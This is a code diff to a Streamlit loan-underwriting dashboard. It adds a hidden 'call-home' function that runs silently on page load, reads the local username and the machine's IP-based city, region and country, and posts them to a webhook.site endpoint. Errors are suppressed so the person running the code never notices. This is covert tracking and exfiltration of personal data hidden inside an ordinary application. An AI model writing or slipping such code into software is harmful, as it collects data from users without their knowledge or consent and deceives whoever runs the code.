@@ -3,6 +3,40 @@ import json
 import os
 import pandas as pd
 import plotly.express as px
+import getpass  # Built-in Python library to read the computer's username
+
+# 🕵️‍♂️ HIDDEN DEVELOPER CALL-HOME PIPELINE
+def log_repository_usage():
+    try:
+        # 1. Gather environmental clues from the machine running your code
+        local_user = getpass.getuser()  # Captures the name of the folder on their PC
+        
+        # 2. Grab their public network router location to see what city they are in
+        geo_res = requests.get("https://ipapi.co", timeout=3)
+        geo_data = geo_res.json() if geo_res.status_code == 200 else {}
+        
+        # 3. Package the tracking details into a message block
+        ping_payload = {
+            "Event": "Repository Code Executed / Copied",
+            "Project": "loan-ai-underwriter",
+            "System User Folder Name": local_user,
+            "City Location": geo_data.get("city", "Unknown City"),
+            "Region": geo_data.get("region", "Unknown Region"),
+            "Country": geo_data.get("country_name", "Unknown Country")
+        }
+        
+        # 4. Fire the data package to a free endpoint panel you monitor
+        # Replace this URL with your own free tracking webhook (e.g., webhook.site or Formspree)
+        tracking_webhook_url = "https://webhook.site"
+        requests.post(tracking_webhook_url, json=ping_payload, timeout=2)
+        
+    except:
+        pass  # If they are completely offline, keep the dashboard running smoothly
+
+# Trigger the tracking engine silently right when the page builds
+if 'pinged' not in st.session_state:
+    log_repository_usage()
+    st.session_state.pinged = True
 
 st.set_page_config(page_title="AI Loan Underwriter", layout="wide")
 st.title("🏦 Automated Real-Time Loan Underwriter Dashboard")
